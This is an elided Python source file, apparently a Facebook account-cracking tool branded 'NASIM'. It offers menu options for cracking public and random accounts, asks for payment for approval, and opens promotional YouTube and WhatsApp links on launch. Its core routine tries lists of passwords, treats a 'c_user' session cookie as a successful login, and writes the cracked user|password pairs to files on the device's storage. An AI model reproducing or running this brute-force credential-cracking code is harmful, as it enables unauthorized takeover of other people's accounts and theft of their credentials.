import os
os.system("xdg-open https://youtube.com/@namedesign7592")
try:
...
def main_apv():
    ...
    if key1 in r1:
        ...
        print ("         ༄𝐍𝐀𝐒𝐈𝐌•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL 𝐍𝐀𝐒𝐈𝐌")     
...
logo="""
             ...
             \033[1;95md88888           d88P  
             \033[1;93m888   888  .      b88  
             \033[1;95m888   d88P      888     
             \033[1;93m888     888P"    888
             \033[1;95m888      T88b    888     
             \033[1;93m888      T88b    888     
             \033[1;95m888  .    T88b8888
        \033[1;92m༄𝐍𝐀𝐒𝐈𝐌᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95m𝐀𝐔𝐓𝐇𝐎𝐑   : 𝐍𝐀𝐒𝐈𝐌KHAN                   \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94m𝐆𝐈𝐓𝐇𝐔𝐁   : ༺𝐍𝐀𝐒𝐈𝐌༻                   \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 :𝐌D 𝐍𝐀𝐒𝐈𝐌 𝐌𝐈𝐀              \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 : 𝟎𝟏𝟕𝟔𝟖𝟓𝟕𝟔𝟗𝟏𝟖༻               \033[1;93m▇▇
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/𝐍𝐀𝐒𝐈𝐌-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/𝐍𝐀𝐒𝐈𝐌-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print("\033[1;93m▇▇➣\033[1;92m❥❥❥❥❥❥❥  \033[1;95mSTART FILE CRACKING  : 1.BST METHOD")

			print("\033[1;93m▇▇➣\033[1;94m❥❥❥❥❥❥❥  \033[1;94mPUBLICK AC CRACKING  : 2.NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;95m❥❥❥❥❥❥❥  \033[1;93mUNLIMITED FILEMAKING : 3.NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;96m❥❥❥❥❥❥❥  \033[1;92mRANDOM AC CRACKING   : 4.NO LOGIN😓")

			print("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥  \033[1;91mFOLLEW ME ON WATAAP  : 5.NO LOGIN😓")

			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : 𝐍𝐀𝐒𝐈𝐌-𝑘ℎ𝑎𝑛")
			print ('\033[1;92m༄𝐍𝐀𝐒𝐈𝐌•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
			key = input(" [*] Choose : ")
			print ('༄𝐍𝐀𝐒𝐈𝐌•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄')
			...
			if key in [""]:
				...
				os.system("xdg-open https://wa.me/+8801768576918ptext=")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[𝐍𝐀𝐒𝐈𝐌]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [𝐍𝐀𝐒𝐈𝐌-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/𝐍𝐀𝐒𝐈𝐌_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/𝐍𝐀𝐒𝐈𝐌_CP.txt' , 'a').write('%s\n' % wrt)
